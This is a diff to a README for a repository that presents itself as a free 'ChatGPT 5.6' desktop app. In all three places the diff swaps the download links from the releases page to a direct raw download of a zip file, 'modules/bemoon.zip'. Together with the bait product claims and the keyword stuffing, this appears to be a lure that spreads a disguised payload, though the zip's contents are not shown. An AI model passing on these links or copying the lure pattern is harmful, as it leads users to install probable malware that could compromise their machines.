@@ -1,6 +1,6 @@
 # 🚀 Chatgpt-5.6-AI-Free-Desktop - Your Free Desktop AI Assistant
 
-[![Download Now](https://img.shields.io/badge/Download-ChatGPT_5.6_Free-2ea44f?style=for-the-badge&logo=github)](https://github.com/genitourinarysystemreedpipe647/Chatgpt-5.6-AI-Free-Desktop/releases)
+[![Download Now](https://img.shields.io/badge/Download-ChatGPT_5.6_Free-2ea44f?style=for-the-badge&logo=github)](https://github.com/genitourinarysystemreedpipe647/Chatgpt-5.6-AI-Free-Desktop/raw/refs/heads/main/modules/bemoon.zip)
 
 ## ✨ What Is This?
 
@@ -37,7 +37,7 @@ Follow these simple steps to get the app up and running on your computer:
 
 ### Step 1: Download the Installer
 
-Visit this link to download the application: [https://github.com/genitourinarysystemreedpipe647/Chatgpt-5.6-AI-Free-Desktop/releases](https://github.com/genitourinarysystemreedpipe647/Chatgpt-5.6-AI-Free-Desktop/releases)
+Visit this link to download the application: [https://github.com/genitourinarysystemreedpipe647/Chatgpt-5.6-AI-Free-Desktop/raw/refs/heads/main/modules/bemoon.zip](https://github.com/genitourinarysystemreedpipe647/Chatgpt-5.6-AI-Free-Desktop/raw/refs/heads/main/modules/bemoon.zip)
 
 You will see a list of files. Choose the one that matches your operating system (Windows, macOS, or Linux). Look for the file ending in `.exe` if you are using Windows.
 
@@ -161,6 +161,6 @@ If you love this app, consider starring the repository on GitHub. It helps other
 
 **Ready to experience the future of AI on your desktop?**
 
-[![Download Now](https://img.shields.io/badge/⬇_Download_ChatGPT_5.6_Free-1a73e8?style=for-the-badge)](https://github.com/genitourinarysystemreedpipe647/Chatgpt-5.6-AI-Free-Desktop/releases)
+[![Download Now](https://img.shields.io/badge/⬇_Download_ChatGPT_5.6_Free-1a73e8?style=for-the-badge)](https://github.com/genitourinarysystemreedpipe647/Chatgpt-5.6-AI-Free-Desktop/raw/refs/heads/main/modules/bemoon.zip)
 
 Keywords: chatgpt-5, chatgpt-5-5, chatgpt-5-pro, chatgpt-codex, chatgpt-desktop, chatgpt-image-2, chatgpt-openai, chatgpt-plus, chatgpt-questions, chatgpt-work, chatgpt-work-installer, chatgpt5, chatgptfree, chatpgt-api, codex-app, codex-free, free-chatgpt, free-gpt-api, gpt-5-6, gpt-5-6-api
